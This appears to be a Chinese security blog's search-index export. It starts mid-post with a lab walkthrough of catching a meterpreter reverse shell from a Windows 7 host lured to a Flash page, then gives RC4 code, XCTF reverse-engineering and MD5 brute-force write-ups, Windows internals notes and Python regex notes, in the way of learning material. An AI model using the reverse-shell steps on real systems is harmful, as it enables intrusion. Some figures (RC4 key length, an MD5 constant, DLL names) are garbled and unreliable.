Linux在mfs5下使用handler模块开启会话监听。回弹一个tcp连接。设置kali渗透机的IP地址。设置监听端口，这个需跟上面msfvenom设置的端口一致。开启监听，等待目标上线。 9、在Windows7上 安装flash插件，使用Win7内置的IE 8浏览器访问页面：http://192.168.36.249/index2.html，页面显示如下。 10、切换到Kali Linux虚拟机，可以看到Kali Linux虚拟机上获取到了meterpreter shell，接下来可以用命令对靶机进行操作和管理。]]></content>
  </entry>
  <entry>
    <title><![CDATA[RC4算法学习]]></title>
    <url>%2F2019%2F09%2F15%2FRC4%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[算法原理RC4生成一种称为密钥流的伪随机流，它与明文通过异或操作混合，以达到加密的目的，解密时与密文进行异或操作。其密钥流由两部分组成，分别是KSA和PRGA。 （1）KSA（the Key-Scheduling Algorithm）RC4首先使用密钥调度算法（KSA）完成对大小为256个字节的数组S的初始化及替换，在替换时使用密钥。其密钥长度一般取516字节，即40128位，通常不超过256位。先用0~255初始化数组S，然后使用密钥进行替换，C语言代码如下： 12345678910111213141516171819202122232425262728293031323334353637/*初始化S盒*/void InitSbox(unsigned char sbox[])&#123; for(int i = 0; i &lt; 256; i++) sbox[i] = i;&#125;/*密钥填充256数组*/void KeyExpansion(unsigned char key[], char *k, int len)&#123; if(len &lt;= 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i % len]; &#125; if(len &gt; 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i]; &#125;&#125;/*打乱S盒*/ void UpsetSbox(unsigned char sbox[], unsigned char key[])&#123; int j = 0; unsigned char temp; int n; for(int i = 0; i &lt; 256; i++) &#123; n = j + (int)sbox[i] + (int)key[i]; j = n % 256; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; &#125;&#125; （2）PRGA（the Pseudo-Random Generation Algorithm）数组S在完成初始化之后，便不再使用输入的密钥。密钥流的生成是从S[0]到S[255]的。对每个S[i]，根据当前的S的值，将S[i]与S中的另一字节置换。在S[255]完成转换后，操作仍重复执行。 12345678910111213141516171819202122/*加解密数据*/ void DataProcess(unsigned char sbox[], FILE *fp1, FILE *fp2)&#123; int i, j; i = 0; j = 0; char ch = fgetc(fp1); while(ch != EOF) &#123; i = (i + 1) % 256; int temp2 = j + (int)sbox[i]; j = temp2 % 256; unsigned char temp; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; int temp1 = (int)sbox[i] + (int)sbox[j]; int t = temp1 % 256; char k = sbox[t]; char cipherchar = ch ^ k; fputc(cipherchar, fp2); ch = fgetc(fp1); &#125;&#125;]]></content>
      <tags>
        <tag>RC4</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道base64算法CTF]]></title>
    <url>%2F2019%2F09%2F13%2F%E4%B8%80%E9%81%93BASE64%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95CTF%2F</url>
    <content type="text"><![CDATA[1、题目内容前两天做了道关于base64算法的题，flag为一段base64编码过后的密文，下面是这道题的链接：https://adworld.xctf.org.cn/media/task/attachments/a5c0e8322d9645468befabddfe0cb51d.exe 题目来源：XCTF社区2、解题过程这是一个exe文件，先用PEID进行查壳，没有壳，运行看看，要求你输入一个flah？拖入IDA，找到_main函数，按F5，代码如下我们可以看到一串关键字符串，逆推，字符串上方有一句for循环语句，经过异或得到下方的字符串，我用C语言写了段代码进行解密，代码如下： 12345678910#include &lt;stdio.h&gt;int main()&#123; int i; char str[50] = "you_know_how_to_remove_junk_code"; for(i = 0; str[i] != '\0'; i++) str[i] = str[i] ^ 0x25; printf("%s\n", str); return 0;&#125; 得到输出： 1\JPzNKJRzMJRzQJzW@HJS@zOPKNzFJA@ 单击v13，再往前推可以发现还有两处di调用过v13，第二处的调用貌似没什么用，应该是垃圾代码，我们直接看第一次调用v13的函数，单击进入 这里是一段关键代码，再点击byte_414E40这个函数 现在可以判断使用了base64解码，所以将刚刚得到的字符串进行编码就可得到falg： 1XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=]]></content>
  </entry>
  <entry>
    <title><![CDATA[一些Windows基础知识]]></title>
    <url>%2F2019%2F09%2F13%2F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1、单位转换bit 位(指的是 0 or 1) byte 字节 1byte = 8 bit word 字 1 word = 2 byte dword (double word) 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB2、字节序大端序（Big endain） ：内存地址低位储存数据的高位， 小端序（Little endain）：内存地址高位储存数据的高位（x86是基于Intel8086处理器的小端体系结构） 3、ASCII码 4、Win APIAPI全名（Application Programming Interface 应用程序编程接口） 用于16位Windows的API（Windows1.0-Windows3.1）称作“Win16”，用于32位Windows的API（Windows 9x/NT/2000/XP/7/10）叫作“Win32”。64位WindowsAPI的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。API函数调用从Win16到Win32的转变中保持兼容，并且数量和功能上不断增强——Windows10 1.0只支持不到450个函数调用，现在已有几千个函数了。 Windows运转的核心是动态链接。Windows提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（DLL）实现。在Windows 9x 中，DLL通常位于\WINDOWS\SYSTEM子目录中。在Windows NT/2000/XP/7中，DLL通常位于系统安装目录的\SYSTEM和\SYSTEM32子目录中。 在早期，Windows的主要部分只需要在3个动态链接库中实现，它们分别代表Windows的三个主要子系统，叫做Kernel、User和GDI。 Kernel （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等； User （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等； GUI （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。 除了上述模块，Windows提供了其他DLL以支持更多功能，包括对象安全性、注册表操作（ADVAPI32.DLL）、通用控件（COMCTL32.DLL）、公共对话框（COMDLG32.DLL）、用户界面外壳（SHELL32.DLL）和网络（NETAPTI32.DLL）。5、WOW64WOW64（Windows-on-Windows64-bit）是64位Windows操作系统的子系统，可以使大多数32位应用程序在不进行修改的情况下运行在64位操作系统上。 64位的Windows，除了带有64位操作系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统文件都放在一个叫做“System32“的文件夹中，\Windows\System32文件夹中包含原生的64位映像文件。为了兼容32位操作系统，还增加了\Windows\SysWOW64文件夹，其中存储了32位的操作系统。 64位应用程序会加载System32目录下64位的kernel32.dll、user32.dll和ntdll.dll。当32位应用程序加载时，WOW64建立32位ntdll.dll所要求的启动环境，将CPU模式切换至32位，并开始执行32位加载器，就如同该进程在原生32位系统上一样。WOW64会对32位ntdll.dll的调用重定向ntdll.dll（64位），而不是发出原生的32位系统调用指令。WOW64转换到原生的64位模式，捕获于系统调用有关的参数，发出对应的原生64位系统调用。当原生的系统调用返回时，WOW64在返回32位模式之前将所有输出参数从64位转换成32位。 WOW64既不支持16位应用程序的执行（32位Windows支持16位应用程序的执行），也不支持加载32位内核模式的设备驱动。WOW64进程只能加载32位的DLL，不能加载原生的64位DLL。类似的，原生的64位进程不能加载32位的DLL。6、Windows消息机制Windows是一个消息（Message）驱动式系统。Windows消息提供在应用程序于应用程序之间、应用程序于Windows系统之间进行通信的手段。应用程序想要实现的功能由消息触发，通过对消息的相应和处理完成。 Windows系统中有两种消息队列：一种是系统消息队列；另一种是应用程序消息队列。计算机的所有输入设备由Windows监控。当一个事件发生时，WIindows先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给相应的函数窗口。（1）SendMessage函数 （2）WM_COMMANFD消息 （3）WM_COMMAND消息 （4）WM_GETTEXT消息 （5）WM_QUIT消息 （6）WM_LBUTTONDOWN消息 7、虚拟内存在默认情况下，32位Windows操作系统的地址空间是在4GB以内。Win32的平坦内存模式使每个进程都拥有自己的虚拟空间。对32位进程来说，这个地址空间是4GB，因为32位指针拥有00000000h-FFFFFFFFh的任何值。此时，进程的代码和数据都放在同一地址空间中，不必区分代码段和数据段。 虚拟内存（Virtual Memory）不是真正的内存，它通过映射（Map）的方法使可用的虚拟地址（Virtual Address）达到4GB，每个应用程序可以获得2GB的虚拟地址，剩下的2GB留给操作系统自用。在Windows NT中，应用程序甚至可以获得3GB的虚拟地址。 Windows是一个分时的多任务操作系统，CPU时间在被分成一个个时间片后分配给不同的应用程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的4GB寻址空间，互不干扰。在物理内存中，操作系统和系统DLL代码需要供每个应用程序调用，所以他们在任意时刻必须被映射。用户的exe程序只在自己所属的时间片内被映射，用户dll则有选择地被映射。 实现方法和过程如下： 1、当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配2GB的虚拟地址（不是内存，只是地址）。 2、虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址（注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的）。 3、如果使用DLL，DLL也会被映射到进程的虚拟地址空间中。然后，虚拟内存管理器把每次内存访问映射到物理地址。]]></content>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows内核函数]]></title>
    <url>%2F2019%2F09%2F12%2FWindows%20%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Windows 内核函数Windows 内核部分会调用一些内核层的函数。这些函数都以固定的开始前缀，分别属于内核中不同的管理模块。通过函数名就可以大致知道这个函数所属的层次和模块。这些主要的前缀如下： * Ex：管理层。“Ex”是“Executive”的开头两个字母。 * Ke：核心层。“Ke”是“Kernel”的开头两个字母。 * HAL：硬件抽象层。“HAL”是“Hardware Abstraction Layer”的缩写。 * Ob：对象管理。“Ob”是“Object”的开头两个字母。 * MM：内存管理。“MM”是“Memory Manager”的缩写。 * Ps：进程（线程）管理。“Ps”表示“Process”。 * Se：安全管理。“Se”是“Security”的开头两个字母。 * Io：I/O管理。 * Fs：文件系统。“Fs”是“File System”的缩写。 * Cc：文件缓存管理。“Cc”表示“Cache”。 * Cm：系统配置管理。“Cm”是“Configuration Manager”的缩写。 * Pp：即插即用管理。“Pp”表示“Pnp”。 * Rtl：运行时程序库。“Rtl”是“Runtime Library”的缩写。 * Zw/Nt：对应于SSDT中的服务函数，例如与文件或者注册表相关的操作函数。 * Flt：Minifilter文件过滤驱动中调用的函数。 * Ndis：Ndis网络框架中调用的函数。]]></content>
      <tags>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道RE学习：IngiteMe]]></title>
    <url>%2F2019%2F09%2F10%2FIgniteMe%E9%80%86%E5%90%91%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、RE-IgniteMe这道题来自XCTF社区，比较简单。 题目链接：https://adworld.xctf.org.cn/media/task/attachments/fac4d1290e604fdfacbbe06fd1a5ca39.exe2、解题思路下载好后我们发现这是一个EXE文件，先拖入PEID查壳看看，发现没有壳。直接运行，题目要求你输入flag，我们用IDA打开，进入_main函数，按F5 我们可以发现一串“Congratulations！”字符，这里应该就是关键判断，双击它sub_4011C0函数，进入查看 可以看到末尾的关键字符串，从后往前推，它的主要算法是异或和加减以及大小写字母之间的转换，我用C语言写了段代码进行解码，代码如下： 12345678910111213141516171819202122int main()&#123; int i; char str[32] = "GONDPHyGjPEKruv&#123;&#123;pj]X@rF"; int num[32] = &#123;0x0D, 0x13,0x17,0x11,2,1, 0x20,0x1D,0x0C,2,0x19,0x2F,0x17,0x2B,0x24, 0x1F,0x1E,0x16,9,0x0F,0x15,0x27,0x13,0x26, 0x0A,0x2F,0x1E,0x1A,0x2D,0x0C,0x22,4&#125;; for(i = 0; str[i] !='\0'; i++) &#123; str[i] = ((str[i]^num[i])-72)^0x55; if(str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') str[i] -= 32; if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') str[i] += 32; &#125; printf("EIS&#123;%s&#125;\n",str); return 0;&#125; 运行后得出flag： 1EIS&#123;wadx_tdgk_aihc_ihkn_pjlm&#125; 3、总结逆向过程需要耐心和不断地尝试。]]></content>
      <tags>
        <tag>XCTF-RE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5算法学习]]></title>
    <url>%2F2019%2F09%2F10%2FMD5%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、题目内容 这里有一段丢失的md5密文 e9032???da???08????911513?0???a2要求你还原出他并且加上nctf{}提交 已知线索 明文为：TASC?O3RJMV?WDJKX?ZM 。 题目来源：安恒杯 简单的MD5密码碰撞，通过对比密文e9032与加密后的数据，定位相关信息。我用Python写了一个简单的解题代码，运行后得出密文。3. 解题代码如下1234567891011121314151617181920import md5Enable = &#123;'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q', 'R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8', '9',' ', '!', '"', '#', '$', '%', '&amp;', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '&gt;', '?', '@','[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k','l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '&#123;', '|', '&#125;', '~'&#125;fiveCode = ""for i in Enable: for j in Enable: for k in Enable: strToDecode = "TASC" + i + "O3RJMV" + j + "WDJKX" + k + "ZM" m1 = md5.new() m1.update(strToDecode) cipher = m1.hexdigest() fiveCode = cipher[0:5] if fiveCode == "e9032": print "密文：" + cipher 结果如下： 1密文：e9032994dabac08080091151380478a2 4、MD5算法1、算法原理 （1）数据填充 填充消息使其长度与448模512同余（即长度=448 mod 512）.也就是说，填充后的消息长度比512的倍数小64位。填充方法：附一个1在消息后面，然后用0来填充，直到消息的长度与448模512同余。至少填充1位，至多填充512位。 （2）添加长度 在上一步的结果之后附上64位的消息长度。如果填充前消息长度大于2^64，则只使用其低64位。添加填充位和消息长度之后，最终消息的长度正好是512的整数倍。 （3）初始化变量 用四个变量（A、B、C、D）来计算消息摘要。这里的A、B、C、D都是32位的寄存器。这些寄存器以下面的十六进制来初始化： A=01234567h，B=89abcdefh，C=fedcbah，D=76543210h 而且，在内存中是以低字节在前的形式储存的，格式如下： 01 23 45 67 89 AB CD EF FE DC BA 98 76 54 32 10 （4）数据处理 以512位分组为单位处理消息。首先定义4个辅助函数，每个都是以3个32为双字作为输入，输出1个32位双字。 F(X，Y，Z) = (X&amp;Y)|((~X)&amp;Z) G(X，Y，Z) = (X&amp;Z)|(Y&amp;(~Z)) H(X，Y，Z) = X^Y^Z I(X，Y，Z) = Y^X|(~Z) 注：&quot;&amp;&quot;是与操作，&quot;|&quot;是或操作，&quot;~&quot;是非操作，&quot;^&quot;是异或操作。 这四轮变换是对进入主循环的521位消息分组的16个32位字分别进行如下操作：将A、B、C、D的副本a、b、c、d中的3个经F、G、H、I运算后的结果与第4个相加，再加上32位字和一个32位字的加法常数，并将所得的值循环左移若干位，最后结果加上啊a、b、c、d其中一个，并回送至A、B、C、D，由此完成一次循环。 所用的加法常数由表T[i]来定义，其中i为1至64之中的值。T[i]等于4294967296乘以abs(sin(i))所得结果的整数部分，其中i用弧度来表示。 FF(a, b, c, d, M[j], s, ti)表示 a = b + ((a + F(b, c, d) + Mj + ti) &lt;&lt;&lt; s) GG(a, b, c, d, M[j], s, ti)表示 a = b + ((a + G(b, c, d) + Mj + ti) &lt;&lt;&lt; s) HH(a, b, c, d, M[j], s, ti)表示 a = b + ((a + H(b, c, d) + Mj + ti) &lt;&lt;&lt; s) II(a, b, c, d, M[j], s, ti)表示 a = b + ((a + I(b, c, d) + Mj + ti) &lt;&lt;&lt; s) For i = 0 to N/16-1 do For j = 0 to 15 do Set X[j] to M[i*16+j] AA=A; BB=B; CC=C; DD=D FF(a,b,c,d,M[0],7,0xd76aa478) ; FF(d,a,b,c,M[1],12,0xe8c7b756) ; FF(c,d,a,b,M[2],17,0x242070db) ; FF(b,c,d,a,M[3],22,0xc1bdceee) ; FF(a,b,c,d,M[4],7,0xf57c0faf) ; FF(d,a,b,c,M[5],12,0x4787c62a) ; FF(c,d,a,b,M[6],17,0xa8304613) ; FF(b,c,d,a,M[7],22,0xfd469501) ; FF(a,b,c,d,M[8],7,0x698098d8) ; FF(d,a,b,c,M[9],12,0x8b44f7af) ; FF(c,d,a,b,M[10],17,0xffff5bb1); FF(b,c,d,a,M[11],22,0x895cd7be); FF(a,b,c,d,M[12],7,0x6b901122) ; FF(d,a,b,c,M[13],12,0xfd987193); FF(c,d,a,b,M[14],17,0xa679438e); FF(b,c,d,a,M[15],22,0x49b40821); GG(a,b,c,d,M[1],5,0xf61e2562) ; GG(d,a,b,c,M[6],9,0xc040b340) ; GG(c,d,a,b,M[11],14,0x265e5a51); GG(b,c,d,a,M[0],20,0xe9b6c7aa) ; GG(a,b,c,d,M[5],5,0xd62f105d) ; GG(d,a,b,c,M[10],9,0x02441453) ; GG(c,d,a,b,M[15],14,0xd8a1e681); GG(b,c,d,a,M[4],20,0xe7d3fbc8) ; GG(a,b,c,d,M[9],5,0x21e1cde6) ; GG(d,a,b,c,M[14],9,0xc33707d6) ; GG(c,d,a,b,M[3],14,0xf4d50d87) ; GG(b,c,d,a,M[8],20,0x455a14ed) ; GG(a,b,c,d,M[13],5,0xa9e3e905) ; GG(d,a,b,c,M[2],9,0xfcefa3f8) ; GG(c,d,a,b,M[7],14,0x676f02d9) ; GG(b,c,d,a,M[12],20,0x8d2a4c8a); HH(a,b,c,d,M[5],4,0xfffa3942) ; HH(d,a,b,c,M[8],11,0x8771f681) ; HH(c,d,a,b,M[11],16,0x6d9d6122); HH(b,c,d,a,M[14],23,0xfde5380c); HH(a,b,c,d,M[1],4,0xa4beea44) ; HH(d,a,b,c,M[4],11,0x4bdecfa9) ; HH(c,d,a,b,M[7],16,0xf6bb4b60) ; HH(b,c,d,a,M[10],23,0xbebfbc70); HH(a,b,c,d,M[13],4,0x289b7ec6) ; HH(d,a,b,c,M[0],11,0xeaa127fa) ; HH(c,d,a,b,M[3],16,0xd4ef3085) ; HH(b,c,d,a,M[6],23,0x04881d05) ; HH(a,b,c,d,M[9],4,0xd9d4d039) ; HH(d,a,b,c,M[12],11,0xe6db99e5); HH(c,d,a,b,M[15],16,0x1fa27cf8); HH(b,c,d,a,M[2],23,0xc4ac5665) ; II(a,b,c,d,M[0],6,0xf4292244) ; II(d,a,b,c,M[7],10,0x432aff97) ; II(c,d,a,b,M[14],15,0xab9423a7); II(b,c,d,a,M[5],21,0xfc93a039) ; II(a,b,c,d,M[12],6,0x655b59c3) ; II(d,a,b,c,M[3],10,0x8f0ccc92) ; II(c,d,a,b,M[10],15,0xffeff47d); II(b,c,d,a,M[1],21,0x85845dd1) ; II(a,b,c,d,M[8],6,0x6fa87e4f) ; II(d,a,b,c,M[15],10,0xfe2ce6e0); II(c,d,a,b,M[6],15,0xa3014314) ; II(b,c,d,a,M[13],21,0x4e0811a1); II(a,b,c,d,M[4],6,0xf7537e82) ; II(d,a,b,c,M[11],10,0xbd3af235); II(c,d,a,b,M[2],15,0x2ad7d2bb) ; II(b,c,d,a,M[9],21,0xeb86d391) ; A = A+AA; B = B+BB; C = C+CC; D = D+DD （5）输出 当512位分组都运算完毕，A、B、C、D的连级将被输出为MD5散列的结果。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式的学习]]></title>
    <url>%2F2019%2F09%2F10%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、re.match函数re.match尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法：1、re.match(pattren, string, flags=0) 说明：pattern:匹配的正则表达式。 string:要匹配的字符串。 flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。匹配成功re.match方法返回一个匹配的对象，否则返回none。可以使用group(num)或group()匹配对象函数来获取匹配表达式。 group(num=0):匹配的整个表达式的字符串，group()可以一次输入多个组号，在这种情况下它将返回一个包含那些所对应值的元组。 groups():返回一个包含所有小组字符串的元组，从1到所含的小组号。实例： 123import reprint(re.match('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.match('com', 'www.runoob.com')) # 不在起始位置匹配 运行结果： 12(0, 3)None 实例： 12345678910111213#!/usr/bin/pythonimport re line = "Cats are smarter than dogs" matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I) if matchObj: print "matchObj.group() : ", matchObj.group() print "matchObj.group(1) : ", matchObj.group(1) print "matchObj.group(2) : ", matchObj.group(2)else: print "No match!!" 运行结果: 123matchObj.group() : Cats are smarter than dogsmatchObj.group(1) : CatsmatchObj.group(2) : smarter 2、re.search方法re.search扫描整个字符串并返回第一个成功的匹配。 函数语法： re.search(p,attern, string, flags=0)实例： 123456#!/usr/bin/python# -*- coding: UTF-8 -*- import reprint(re.search('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.search('com', 'www.runoob.com').span()) # 不在起始位置匹配 结果： 12(0, 3)(11, 14) re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 3、检索和替换re.sub(pattren, repl, string, count=0, flags=0) 说明：repl：替换的字符串，也可以为一个函数。 count：模式匹配后替换的最大次数，默认0表示替换所有的匹配。1234567891011121314#!/usr/bin/python# -*- coding: UTF-8 -*- import re phone = "2004-959-559 # 这是一个国外电话号码" # 删除字符串中的 Python注释 num = re.sub(r'#.*$', "", phone)print "电话号码是: ", num # 删除非数字(-)的字符串 num = re.sub(r'\D', "", phone)print "电话号码是 : ", num 结果： 12电话号码是: 2004-959-559 电话号码是 : 2004959559 findall 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次 findall 匹配所有。语法格式为： findall(string[, pos[, endpos]]) 参数： string : 待匹配的字符串。 pos : 可选参数，指定字符串的起始位置，默认为 0。 endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。实例： 12345678910# -*- coding:UTF8 -*- import re pattern = re.compile(r'\d+') # 查找数字result1 = pattern.findall('runoob 123 google 456')result2 = pattern.findall('run88oob123google456', 0, 10) print(result1)print(result2) 结果： 12['123', '456']['88', '12'] re.finditer 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0)实例： 1234import reit = re.finditer(r"\d+","12a32bc43jf3") for match in it: print (match.group() ) 结果： 123412 32 43 3 4、正则表达式修饰符 - 可选标志re.I：使匹配对大小写不敏感 re.L：做本地化识别（locale-aware）匹配 re.M：多行匹配，影响 ^ 和 $ re.S：使 . 匹配包括换行在内的所有字符 re.U：根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B. re.X：该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。6、正则表达式模式^：匹配字符串的开头$：匹配字符串的末尾。.：匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。[…]：用来表示一组字符,单独列出：[amk] 匹配’a’，’m’或’k’[^…]：不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。re：匹配0个或多个的表达式。re+：匹配1个或多个的表达式。re?：匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式re{ n}：精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。re{ n,}：匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于”o“。re{ n, m}：匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式a| b：匹配a或b(re)：对正则表达式分组并记住匹配的文本(?imx)：正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。(?-imx)：正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。(?: re)：类似 (…), 但是不表示一个组(?imx: re)：在括号中使用i, m, 或 x 可选标志(?-imx: re)：在括号中不使用i, m, 或 x 可选标志(?#…)：注释.(?= re)：前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。(?! re)：前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功(?&gt; re)：匹配的独立模式，省去回溯。\w：匹配字母数字及下划线\W：匹配非字母数字及下划线\s：匹配任意空白字符，等价于 [\t\n\r\f].\S：匹配任意非空字符\d：匹配任意数字，等价于 [0-9].\D：匹配任意非数字\A：匹配字符串开始\Z：匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。\z：匹配字符串结束\G：匹配最后匹配完成的位置。\b：匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’：可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B：匹配非单词边界。’er\B’ 能匹配 “verb”中的’er’，但不能匹配 “never” 中的 ‘er’。\n, \t, 等. ：匹配一个换行符。匹配一个制表符。等\1…\9：匹配第n个分组的内容。\10：匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。]]></content>
  </entry>
</search>
